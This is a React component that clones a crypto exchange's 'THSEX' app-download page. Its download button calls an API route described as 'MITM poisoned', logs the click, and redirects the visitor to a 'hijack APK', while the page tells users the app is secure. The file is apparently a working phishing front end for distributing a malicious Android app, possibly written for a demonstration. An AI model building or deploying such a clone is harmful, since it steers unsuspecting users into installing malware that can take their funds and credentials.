"use client";

import { useState } from "react";
import { HIJACK_APK_PATH } from "@/lib/config";

type ApiRow = { type?: string; url?: string };

async function logHit(action: string) {
  try {
    await fetch("/api/hit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action, path: "/pages/downapp/index" }),
    });
  } catch {
    /* ignore */
  }
}

type Props = {
  onApiResponse?: (data: unknown) => void;
  useMitmProxy?: boolean;
};

export default function DownAppClone({ onApiResponse, useMitmProxy = true }: Props) {
  const [status, setStatus] = useState("");
  const [loading, setLoading] = useState(false);

  async function handleAndroidDownload() {
    setLoading(true);
    setStatus("Calling /api/downloadlink (MITM poisoned)...");

    const apiPath = useMitmProxy ? "/api/proxy/downloadlink" : "/api/real/downloadlink";

    try {
      const res = await fetch(apiPath, { cache: "no-store" });
      const json = await res.json();
      onApiResponse?.(json);

      const rows: ApiRow[] = Array.isArray(json.data) ? json.data : [];
      const android = rows.find((r) => String(r.type || "").toLowerCase().includes("android"));
      const url = android?.url || HIJACK_APK_PATH;

      await logHit("android_apk_download");
      setStatus(`Redirecting to hijack APK: ${url}`);
      window.location.href = url;
    } catch {
      await logHit("android_apk_download_fallback");
      setStatus("Fallback — direct hijack APK");
      window.location.href = HIJACK_APK_PATH;
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="downapp-page">
      <header className="downapp-nav">THSEX</header>

      <section className="downapp-hero">
        <h1>
          Digital asset trading -
          <br />
          <span>start trading</span>
        </h1>
        <p>
          Install now and start trading immediately. Secure, fast, and built for mobile traders.
        </p>
        <div className="downapp-hero-img">
          <div className="downapp-phone">
            <div className="downapp-phone-screen">THSEX</div>
          </div>
        </div>
      </section>

      <section className="downapp-card">
        <button
          type="button"
          className="downapp-btn"
          onClick={handleAndroidDownload}
          disabled={loading}
          aria-label="Download Android APK"
        >
          <img
            src="/assets/icon_downapp.png"
            alt="Download on the Android APK"
            onError={(e) => {
              const img = e.currentTarget;
              img.style.display = "none";
              const fb = img.nextElementSibling as HTMLElement | null;
              if (fb) fb.style.display = "block";
            }}
          />
          <span className="downapp-btn-fallback">Download on the Android APK</span>
        </button>

        <button type="button" className="downapp-btn downapp-btn-disabled" disabled>
          <img
            src="/assets/download.png"
            alt="Download on the App Store"
            onError={(e) => {
              e.currentTarget.style.display = "none";
            }}
          />
        </button>
      </section>

      <p className="downapp-install">
        Install now, <span>start trading</span>
        <br />
        Please do not disclose your password, SMS code, or Google verification code to anyone.
      </p>

      {status && <p className="downapp-status">{status}</p>}
    </div>
  );
}
